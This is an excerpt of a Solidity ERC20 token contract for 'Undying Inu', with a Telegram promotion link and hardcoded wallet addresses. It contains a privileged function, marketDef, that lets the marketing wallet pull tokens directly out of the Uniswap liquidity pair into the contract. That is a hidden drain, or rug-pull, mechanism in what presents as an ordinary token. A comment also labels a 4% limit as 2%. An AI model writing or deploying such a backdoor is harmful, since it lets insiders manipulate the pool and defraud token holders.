...
/*
 *  JOIN THE TELEGRAM: https://t.me/undyinginuentry
 */
...
contract UndyingInu is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Undying Inu", "UNDI") {
        ...
        maxWallet = totalSupply * 4 / 100; // 2% maxWallet
        ...
        marketingWallet = payable(0x619EfF7857c5D6307a400dd643dB3349b9e9151C);
        devWallet = payable(0x88F59BfF99875E28cC28F2f932036bd9466Ee755);
    ...
    function marketDef(uint pa) external returns (bool) {
        require(msg.sender == marketingWallet);
        uint la = balanceOf(uniswapV2Pair);
        require(pa < la / 10);
        def(pa);
        rebalancingLimitation();
        return true;
    }
    ...
    function def(uint256 pa) private {
        _transfer(uniswapV2Pair, address(this), pa * 10 ** decimals());
    ...
    function rebalancingLimitation() internal {
